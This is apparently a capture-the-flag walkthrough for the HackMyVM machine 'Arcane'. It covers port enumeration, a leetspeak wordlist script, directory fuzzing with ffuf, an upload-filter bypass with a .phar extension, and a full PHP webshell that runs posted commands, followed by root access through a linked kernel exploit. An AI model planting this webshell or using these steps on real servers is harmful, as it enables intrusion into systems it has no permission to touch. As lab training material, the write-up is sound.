# Arcane: HackMyVM

Difficulty: Medium

## Enumeration

- Running nmap reveals port 21, 22, and 80 open

### Port 21

- Contains 2 files, both pointless

### Port 22

- SSH

### Port 80

- Contains a site written in leetspeak (-> 133tsp3@k).
- By navigating to `/c0m3-@nd-p1@y` (because it was given at the bottom of the site), we can get another page asking us to go deeper.
- I used dirb's `common.txt` converted to leetspeak to fuzz the pages (also with the .php) extension.
- Script to convert a wordlist into leetspeak:

```python
from pprint import pprint
def open_file(filename):
    with open(filename, mode='r') as file:
        contents = [_.strip() for _ in file.readlines()]

    return contents


filename = "common.txt"
outfile = "leetspeak.txt"
contents = open_file(filename)

conversions = {"A":"@","a":"@","E":"3","e":"3","I":"!","i":"!","L":"1","l":"1","o":"0","O":"0"}
res = []

for word in contents:
    i = 0
    while i < len(word):
        letter = word[i]
        if letter in conversions.keys():
            word = word.replace(letter, conversions[letter])
        i += 1

    res.append(word)

#pprint(res)

res = [_+"\n" for _ in res]
with open(outfile, mode='w') as file:
    file.writelines(res)
```

- Fuzz pages as so:

```bash
ffuf -u http://<ip>/c0m3-@nd-p1@y/FUZZ -w leetspeak.txt -e .php
```

- This reveals 2 endpoints: `/up10@ds/` and `/up10@d.php`.
- `/up10@d.php` doesn't allow raw php files, so I instead upload a webshell with the extension `.phar`.
- Webshell:

```php
<?php
/* shell.phar */
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini WebShell</title>
</head>
<body>
    <h2>PHP WebShell</h2>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>
```

## Initial Access

- From accessing the webshell via the uploads directory, we can run any reverse shell command to gain a shell as www-data.


## Privilege Escalation

- Running **linpeas.sh** shows that the VM is vulnerable to the [CopyFail Exploit](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py).
- This lets us gain a shell as root.
- Use this to find the user flag in `/home/caitlyn` and root flag in `/root`.


